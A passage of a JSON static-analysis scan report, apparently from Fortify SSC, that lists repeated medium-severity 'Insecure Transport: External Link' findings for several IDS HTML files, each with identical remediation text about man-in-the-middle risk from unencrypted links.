http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4720/?engineType=SCA&issue=E99A4C23F462904BE6EFA27D9C5417E7"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4721",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Init.html on line 410 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4721/?engineType=SCA&issue=E99A4C23F462904BE6EFA27D9C5417E8"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4704",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Composite.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4704/?engineType=SCA&issue=E1D5783E24A4943D5D47D16183F5C3DF"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4705",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Composite.html on line 34 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4705/?engineType=SCA&issue=E1D5783E24A4943D5D47D16183F5C3E0"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4706",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Composite.html on line 240 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4706/?engineType=SCA&issue=E1D5783E24A4943D5D47D16183F5C3E1"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4537",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Database.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4537/?engineType=SCA&issue=6EE1B4A306EED69C2D8C564BDBD19713"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4538",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Database.html on line 38 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4538/?engineType=SCA&issue=6EE1B4A306EED69C2D8C564BDBD19714"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4539",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Database.html on line 197 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4539/?engineType=SCA&issue=6EE1B4A306EED69C2D8C564BDBD19715"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4603",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Email.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4603/?engineType=SCA&issue=9726E26A9E6E05D56ECC435F23413857"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4604",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Email.html on line 38 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4604/?engineType=SCA&issue=9726E26A9E6E05D56ECC435F23413858"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4605",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Email.html on line 304 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4605/?engineType=SCA&issue=9726E26A9E6E05D56ECC435F23413859"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4645",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_File.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4645/?engineType=SCA&issue=B6B8215F10CE54F75A1BC6591FD58E28"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4646",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_File.html on line 38 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4646/?engineType=SCA&issue=B6B8215F10CE54F75A1BC6591FD58E29"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4647",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_File.html on line 231 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4647/?engineType=SCA&issue=B6B8215F10CE54F75A1BC6591FD58E2A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4727",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Interface.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4727/?engineType=SCA&issue=F07C1A863475074ED672B36001DA5E19"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4728",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Interface.html on line 32 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4728/?engineType=SCA&issue=F07C1A863475074ED672B36001DA5E1A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4729",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Log_Interface.html on line 113 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4729/?engineType=SCA&issue=F07C1A863475074ED672B36001DA5E1B"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4733",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Monitor.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4733/?engineType=SCA&issue=F0D3C6E6489308A719C0E8512F3A68E7"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4734",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Monitor.html on line 34 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4734/?engineType=SCA&issue=F0D3C6E6489308A719C0E8512F3A68E8"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4735",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Monitor.html on line 535 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4735/?engineType=SCA&issue=F0D3C6E6489308A719C0E8512F3A68E9"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4577",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Report.html on line 38 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4577/?engineType=SCA&issue=8B672EB4279FD17210008E4A60B3E889"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4578",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Report.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4578/?engineType=SCA&issue=8B672EB4279FD17210008E4A60B3E88A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4579",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Report.html on line 648 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4579/?engineType=SCA&issue=8B672EB4279FD17210008E4A60B3E88B"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4677",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Caching---Database.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
